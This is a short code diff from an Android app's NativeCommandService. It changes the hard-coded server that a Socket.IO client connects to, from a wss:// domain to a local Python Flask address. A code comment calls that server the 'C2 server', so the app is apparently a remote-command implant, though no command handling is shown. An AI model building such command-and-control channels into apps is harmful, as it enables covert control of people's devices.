@@ -304,19 +304,20 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
     }
     
     private fun initializeSocketIOClient() {
-        try {
-            socketIOClient = NativeSocketIOClient(this, this)
-            
-            // Get C2 server URL from config
-            val serverUrl = "wss://ws.sosa-qav.es" // Fixed to use WSS for HTTPS
-            
-            socketIOClient?.initialize(serverUrl, deviceId)
-            
-            Log.d(TAG, "Socket.IO client initialized for device: $deviceId")
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to initialize Socket.IO client", e)
-        }
+    try {
+        socketIOClient = NativeSocketIOClient(this, this)
+        
+        // ✅ FIXED: Use HTTP URL for Python Flask-SocketIO server
+        val serverUrl = "http://192.168.8.200:5000"  // Your Python server
+        
+        socketIOClient?.initialize(serverUrl, deviceId)
+        
+        Log.d(TAG, "Socket.IO client initialized for Python server: $serverUrl")
+        Log.d(TAG, "Device ID: $deviceId")
+    } catch (e: Exception) {
+        Log.e(TAG, "Failed to initialize Socket.IO client", e)
     }
+}
     
     private fun startConnectionMonitoring() {
         connectionCheckJob = reconnectScope.launch {
